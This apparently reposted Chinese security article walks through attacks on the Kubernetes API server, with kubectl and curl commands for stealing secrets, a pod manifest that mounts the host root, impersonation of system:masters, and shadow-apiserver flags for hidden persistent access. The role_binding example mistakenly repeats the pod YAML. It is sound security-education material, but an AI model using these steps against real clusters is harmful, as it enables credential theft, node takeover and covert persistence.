<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ly7UEDwpkZcYPnyyOi0wWw)

文章首发于：

火线 Zone 社区（https://zone.huoxian.cn/）

**apiserver 简介**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

API Server 作为 K8s 集群的管理入口，在集群中被用于提供 API 来控制集群内部。默认情况下使用 8080 （insecure-port，非安全端口）和 6443 （secure-port，安全端口）端口，其中 8080 端口无需认证，6443 端口需要认证且有 TLS 保护。

**apiserver 工作原理图：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1FAiahF2SvOkOIFPnvzibYckgGgSbOnC9DBbmtaF3MWOxZkdnxfiakI5Aw/640?wx_fmt=png)

**而 apiserver 在渗透测试过程中受到以下风险：**

*   apiserver 的 Insecure-port 端口对外暴露
    
*   apiserver 未授权配置错误 (匿名访问 + 绑定高权限角色)
    
*   历史 apiserver 提权漏洞 (例如 CVE-2018-1002105)
    
*   配置不当的 RBAC 受到的提权风险
    
*   apiserver 权限维持
    
*   ...
    

‍  

**apiserver 的 Insecure-port 端口对外暴露**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

API Server 作为 K8s 集群的管理入口，在集群中被用于提供 API 来控制集群内部。默认情况下使用 8080 （insecure-port，非安全端口）和 6443 （secure-port，安全端口）端口，其中 8080 端口无需认证，6443 端口需要认证且有 TLS 保护。

如果其在生产环境中 Insecure-port 被暴露出来，便利用此端口进行对集群的攻击。

但是这种情况很少了，条件必须是低版本（1.20 版本后该选项已无效化）加配置中 ( /etc/kubernets/manifests/kube-apiserver.yaml ) 写了 insecure-port 选项, 默认不开启：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Tv1dfdj8YVXFibr9pk8R8N2WVsrf8Y885F7WTlD4XibRjVSMxok45riaA/640?wx_fmt=png)

**apiserver 未授权配置错误 (匿名访问 + 绑定高权限角色)**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

Api server 的 6443 （secure-port，安全端口）认证是需要凭据的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1yaJNwwwMiawE6Zy0Eql2LPNN9D86m5I305hN1MsRY2Yy47RkM9SUMDQ/640?wx_fmt=png)

如果配置错误，将 system:anonymous 用户绑定到了 cluster-admin 用户组，那么匿名用户可以支配集群。

```
kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq11UwRT0g30bDSw9upslZRr731w1z3JiaN9GfcjUJDgjd4sPmw7c2dwyg/640?wx_fmt=png)

这种配置下可以拿到所有 token 后与 api server 交互，支配集群：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1A6RdjebmokyKMpjRs99PE4vXBHNXLDbmaNdEM89wxmKicIVqwbNIMrg/640?wx_fmt=png)

**历史 apiserver 提权漏洞 (例如 CVE-2018-1002105)**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

CVE-2018-1002105 是一个 K8s 提权漏洞，Kubernetes 用户可以在已建立的 API Server 连接上，打通了 client 到 kubelet 的通道，实现提升 k8s 普通用户到 k8s api server 的权限。

**漏洞影响版本**

*   Kubernetes v1.0.x-1.9.x
    
*   Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)
    
*   Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)
    
*   Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)
    

**漏洞利用条件**

这边普通用户至少需要具有一个 pod 的 exec/attach/portforward 等权限。

**环境：**

构造一个命名空间 test，和一个 test 命名空间的 pod，原有权限是对 test 命名空间下的 pod 的 exec 权限，漏洞利用后将权限提升为了 API Server 权限，这里用 metarget 靶场起一个环境：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Kltpc60NhTG8Lic1OicTvicFfKHwjnHPDcEnYSORNGsZOmicF58X7hx6GQ/640?wx_fmt=png)

创建 namespace:

```
apiVersion: v1
kind: Namespace
metadata:
  name: test
```

创建 role：

```
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: test
  namespace: test
rules:
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - get
  - list
  - delete
  - watch
- apiGroups:
  - ""
  resources:
  - pods/exec
  verbs:
  - create
  - get
```

创建 role_binding.yml:

```
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: test
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  serviceAccount: default
  serviceAccountName: default
```

创建 pod：

```
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: test
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  serviceAccount: default
  serviceAccountName: default
```

最后给用户配置一个静态的 token 文件来配置用户的认证：

当在命令行上指定 --token-auth-file=SOMEFILE 选项时，API server 从文件读取 bearer token。

token 文件是一个 csv 文件，每行至少包含三列：token、用户名、用户 uid：

```
token,user,uid,"group1,group2,group3"
```

这里使用到的配置 token：

```
password,test,test,test
```

验证：

对指定 test 空间下的 pod 执行命令是可以的：

```
kubectl --token=password --server=https://192.168.1.22:6443 --insecure-skip-tls-verify exec -it test -n test /bin/hostname
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1OaDxySwG9GPnhq2gvNUibnHBZo1T5s3WhW4RGUQDBYq9J3FVtUjM55Q/640?wx_fmt=png)

对其他命名空间越权操作发现提示权限不足：

```
kubectl --token=password --server=https://192.168.1.22:6443 --insecure-skip-tls-verify get pods -n kube-system
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1t9o2oMVVkGhcjemNqtEEl82lQvYplM1M7Mny23moWSWb6JCKklfzGw/640?wx_fmt=png)

**漏洞复现：**

exp：https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py

exp 中也是会创建一个挂载宿主机根目录的 pod，实现容器逃，而创建的基础是利用前面说的高权限 websocket 连接，利用这个连接向 apiserver 发送命令，窃取高凭据文件，再利用凭据文件创建 pod，挂载宿主机根目录。

挂载了以后读取宿主机节点的 / etc/kubernetes/pki 目录下的大量敏感凭据：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1oA5IZVzpRdlEt7M148YNAIuysCHEiaClEvv0vx8sRunfrHzA1SIP1kA/640?wx_fmt=png)

exp 中指定读取的证书文件：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Ljto6m2hh5IEro45HELO0xldeVOwY0z38VuB4QibjPm7BO99gfZY9icw/640?wx_fmt=png)

利用：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1IwtU4TicPXNhQs1MvicD4A6NKJVcvpszJX38g0jBkUr3UXldvPWHMicFA/640?wx_fmt=png)

这样就拿到了凭据，最后就是创建 pod 挂载宿主机根目录：

```
# attacker.yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - name: escape-host
      mountPath: /host-escape-door
  volumes:
    - name: escape-host
      hostPath:
        path: /
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1UuVgaYKoricSzmpFg1jpltxWUic7wjyLMAo9OhQOJYrYSq7yhUxSEHNw/640?wx_fmt=png)

host-escape-door 目录为 pod 挂载宿主机的目录, 发现已经可以查看 apiserver 宿主机的目录：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1aqcrIMl6qGsagEVB5v64h0ib43BJvPhXdicQtNmJg7ibkPEyJjvkwE9eQ/640?wx_fmt=png)

**配置不当的 RBAC 受到的提权风险**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

**RBAC 权限滥用提权**

权限滥用主要在对特定资源有特定操作的情况下，可以有特定的权限提升。

**枚举当前 RBAC 权限**

在指定当前通过渗透得到用户凭据或者 sa 的凭据后，可以先枚举当前有哪些权限：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1hZLxQjvXkvUl8g0yP6dNRn2rJ221uIyShSE4pwvYkTJ2H77q5dmXtA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1ia2EMUYbeshgSibLdeictde7LGwR50q4pg6HxR1s1mpxv7xnPAUicHibGfg/640?wx_fmt=png)

也可以使用 curl 对 apiserver 的 api 进行访问来区别当前的权限:

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Irfc99QxqSAtzdIJ4e1nxIHvSHKf4ZXB8Bictuq1g1jH0FTDOAlkzOQ/640?wx_fmt=png)

枚举之后应该对当前凭据对资源的操作有个数了，下面列举在分配权限时，哪些情况下有提权提升的可能。

**create pods 权限**

`resources: ["*"] verbs: ["create"]`：`resources`为 * 或者为`pods`的情况下，verbs 是`create`，在集群中可以创建任意资源，比如像 pods，roles. 而创建 pods 的命名空间也取决你 role 中 metadata.namespace 的值：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq12NL3WMEwQRhaaTInIc093mVS8icPIZZTXOOv9Ka8FABLTXjmVVRIJibA/640?wx_fmt=png)

如果有 create 权限，常见攻击手法就是创建挂载根目录的 pod，跳到 node：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1B9NymiceI0kSG7veic93tpiajMBtLTqZCRgQibtnib3Lw5k8ktwFFj1IY4Q/640?wx_fmt=png)

**list secrets 权限**

`resources: ["*"] verbs: ["list"]`：`resources`为 * 或者为`secrets`的情况下，verbs 是`list`, 在集群中可以列出其他 user 的 secrets，一般拿来寻找特权账号凭据。

具有 list 权限或者说是 list secrets 权限的 role 可以列出集群中重要的 secrets，包括管理的 keys(JWT):

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1eyOHwxsKaHC5xReO2ZIgmQ8ibB2aC5QCQzicQCtuX9bcvPXctuPhBib4g/640?wx_fmt=png)

**利用：**  

```
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

**get secret 权限**

`resources: ["*"] verbs: ["get"]`: `resources`为 * 或者为`secrets`的情况下，verbs 是`get`，get 可以在集群中获得其他 service accounts 的 secrets。

如下定义 Role 的 resources 字段为 * 或者 secrets 对象，并且 verbs 为 get，这时候有权限获得其他 secrets。

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1K3muWMuxlCpicrJe8Zk8JCGsVoB3ermUJXZc6uQLaHbmOtSdUjjibJag/640?wx_fmt=png)

get 权限能访问的 api：

```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```

但是 get 和 list 不一样，get 需要知道 secrets 的 id 才能读：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1rebw2HbpibXj3xpXSwy1YRB2KJF9UCBe6YmQkXLmmZGyRlUpEicPXQhg/640?wx_fmt=png)

图出处：list 和 get 来窃取凭据的区别：https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf

这时候用读 secrets 来攻击的话常见手法是读默认的 sa 的 token, 默认有这些 sa:

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq10v4AqdYtf68wDjA1vfvVXnc5P6qbjiaYBEskWMqrIicDDEo7Rhh8mtWg/640?wx_fmt=png)

对应的 token:

```
kubectl -n kube-system get secret -n kube-system
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq11HplKU7pFPINkNPp6b9xPshmscSpdaV8Xib4bElgZsAhYcLaGjPM2Zg/640?wx_fmt=png)

可以看到每个 sa 的 token 都是 sa 的 name-token - 随机五个字符

其中随机的字符是由数字和字母组合，特定的 27 个字符：

https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#183：#  

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1ULLuXZ0Z50dvE1AslvzFy5gLU3WrSc8EjQPT42GXpqPmj6zsKZOmmQ/640?wx_fmt=png)

27 的 5 次方也是 14,348,907 可能，写个 py 脚本的迭代器爆破即可：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq10d33ltoDicFBQCgQBdMge9zKX0XqxYfJIDMRibd5KrtXnpU4jiaREDRtg/640?wx_fmt=png)

**get list watch secrets 权限**

`resources: ["*"] verbs: ["get","list","watch"]`:resources 字段为 * 或者 secrets 的话可以利用这三个权限，来创建一个恶意 pod 后通过挂载 secrets 以至获取别人的 secrets，然后外带：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1VKu5s3gh0tz0UVre5MEPTfz8jq7DgjA8B9oHprpSwBUpbpWSR88djA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1RBkQKjmbAxUM2ia3Q938EhRicwbeib1ezib0ibaHBjLBhTQ6lQLaqeNcPIw/640?wx_fmt=png)

这里使用`automountServiceAccountToken`将特权服务帐户的令牌挂载到 pod，使用令牌获取拿到所有 secrets 后用 nc 传到攻击者监听端口，当前也可以使用其他方式带外：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Bp7431Bb8pJkgoZmhR3rk1XM5ZsXFib5DpPFJQgGkWBFjC06vsbs4CA/640?wx_fmt=png)

图出处：创建一个 "hot pod" 来窃取凭据：https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf

**Impersonate 权限**

用户可以通过模拟标头充当另一个用户。这些让请求手动覆盖请求身份验证的用户信息。例如，管理员可以使用此功能通过临时模拟另一个用户并查看请求是否被拒绝来调试授权策略。

以下 HTTP 标头可用于执行模拟请求：

*   Impersonate-User：要充当的用户名。
    
*   Impersonate-Group：要充当的组名。可以多次提供设置多个组。可选的。需要 “模拟用户”。
    
*   Impersonate-Extra-(extra name)：用于将额外字段与用户关联的动态标题。可选的。需要 “模拟用户”。
    
*   Impersonate-Uid：代表被模拟用户的唯一标识符。可选的。需要 “模拟用户”。Kubernetes 对此字符串没有任何格式要求。
    

有了 Impersonate 权限攻击者可以模拟一个有特权的账户或者组：

Role:

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1yiazFYMZfLWOXnAhMdAHQS2GFXdhfHAKnicN8FqibRJRYxjEr1wcVnxicw/640?wx_fmt=png)

binding:

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1gAib8MtYSjlVPBfBRSC3jSiagicN4kPFXXZicJn7IQ7mNKYcqJsVwib9Jdw/640?wx_fmt=png)

模拟用户的操作是通过调用 K8s API 的 Header 来指定的，kubectl 可以加入 --as 参数：

```
kubectl --as <user-to-impersonate> ...
kubectl --as <user-to-impersonate> --as-group <group-to-impersonate> ...
```

请求 apiserver:

```
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\ 
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

**apiserver 权限维持**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

在渗透权限维持阶段如果像常规对机器比如容器做权限维持的话， 是有弊端的，因为在 K8s 中会对 pod 进行扩容和缩容，权限维持的机器就会变得有生命周期而使已获得权限变得不稳定。所以在 K8s 中利用 apiserver 做权限维持是个不错的选择。

**shadow apiserver**

shadow apiserver 就是创建一种针对 K8s 集群的隐蔽持续控制通道， 在原有的 apiserver 上开放更大的权限并且放弃日志审计，从而达到隐蔽性和持久控制目的。

pdf：

https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18317/2020_USA20_CSV-F01_01_Advanced%20Persistence%20Threats%20The%20Future%20of%20Kubernetes%20Attacks.pdf

原本 apiserver 信息：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1iaITKNqw80yTlsiabEb3DZKicjp4rOibv022OrhcV6EbPGiapCsibD7ib6kIg/640?wx_fmt=png)

apiserver pod 的详细：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1Knu5fZDk2icSlVvZ4Bklgtcjz5OwwPkTvsYO14SwsyVcIA9WQgKIdUQ/640?wx_fmt=png)

构造 shadow apiserver 需要在原有的基础上增加功能, 总所周知 cdk 工具可以一键部署 shadow apiserver：

`pkg/exploit/k8s_shadow_apiserver.go`:

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq15cuDTHTicGoAOtJ2Sib8EPctKZxJ0wFtC5yB5Yibzlb6zDXvia7eUsI6cg/640?wx_fmt=png)

可以发现 cdk 在配置文件中添加：

```
--allow-privileged
--insecure-port=9443
--insecure-bind-address=0.0.0.0
--secure-port=9444
--anonymous-auth=true
--authorization-mode=AlwaysAllow
```

可以看到通过参数新启动的 apiserver 允许了容器请求特权模式，暴露了 insecure-port 为 9443，监听地址绑定为 0.0.0.0，允许了匿名访问，允许所有请求。  

也可以修改 cdk 中原有配置的参数来定制你的后门 apiserver。直接修改 argInsertReg.ReplaceAllString 函数里的内容即可。

ps ：

insecure-port 的参数在最新 cdk 已经被注释了，这个参数在 K8s 1.24 会直接弃用。

所以这个时候当前可以匿名向 apiserver 访问请求管理集群，curl/kubectl 去请求

kubectl -s 192.168.1.22:6443 get pods,deployment -o wide

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1boz9kZr3nfq7iapa92prCjeFh7dXlVXYgTJWriba3QqO6reIPUxt6c2g/640?wx_fmt=png)

**最后**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JWNkicfNibFPBxTyibG7ZrQ34VFKQworxQAkCt1yCNCn2qlHibCUzB0PiaJKYTj3YzD04GeGVzqy4GIibV1Bz9poEepQ/640?wx_fmt=gif)

k8s API Server 提供了 k8s 各类资源对象（pod,RC,Service 等）的增删改查及 watch 等 HTTP Rest 接口，是整个系统的数据总线和数据中心，充当了集群中不可或缺的一个角色，因此 apiserver 组件的安全以及基线检查工作对于集群来说尤为重要，在集群安全的角度对 apiserver 组件安全问题和风险也应该保持持续的关注。

**【火线 Zone 云安全社区群】**

进群可以与技术大佬互相交流

进群有机会免费领取节假日礼品

进群可以免费观看技术分享直播

识别二维码回复**【社区群】**进群

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq17wjjibuo5K5XcniaJr2Wpj7HXAVfSbfIXcjPttaCuqEDib7uDAxKWrTEw/640?wx_fmt=jpeg)

**【相关精选文章】**

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1dHibib0NGO06SZiauibSQia6HvA1nQKy7z3e2vgwf9uBribxiaAzpCsab2wxA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495623&idx=1&sn=b8545551b2d5b030dbb55bc1ce0ea9a6&chksm=eaa967e7dddeeef1ad4027d071be742c75fc1d7f7fe9c48c7ab8ac3e7af176d39945d2393fa5&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1VfbA8heBSgLam58ctwsj7yvFSlaUibR7l6ebKfrFRTibZwutPZdTMVLg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495672&idx=1&sn=5a43a5482769a476a870f49962c6d581&chksm=eaa967d8dddeeece563deeed31b727674e425c7fa244eadd99e525952e98140d5bf496f169fd&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1TeKD9xOh7O84kc0icxXbPGJPDKsKc265uDkQTAhsvdazE0ThcUh9PYg/640?wx_fmt=png)

火线 Zone 是 [火线安全平台] 运营的云安全社区，内容涵盖云计算、云安全、漏洞分析、攻防等热门主题，研究讨论云安全相关技术，助力所有云上用户实现全面的安全防护。欢迎具备分享和探索精神的云上用户加入火线 Zone 社区，共建一个云安全优质社区！

如需转载火线 Zone 公众号内的文章请联系火线小助手：hxanquan（微信）  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaR6whakfznBibS4vGaRuuhq1cibPPqicZhoFhmibKb1AqR1y0ha5U3yVAegaoFbhyq5jAOJqwbIhTp8vw/640?wx_fmt=jpeg)

//  火线 Zone //

微信号 : huoxian_zone

  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CkzQxaHZX9KdW919vwagVwhCeicQPXuMGibHcf2WqiaFyvfy5p1oIk1C5SOdtTyLlQmOtEia7FMKicknJzGTmYLWb2Q/640?wx_fmt=gif)

点击阅读原文，加入社区，共建一个有技术氛围的优质社区！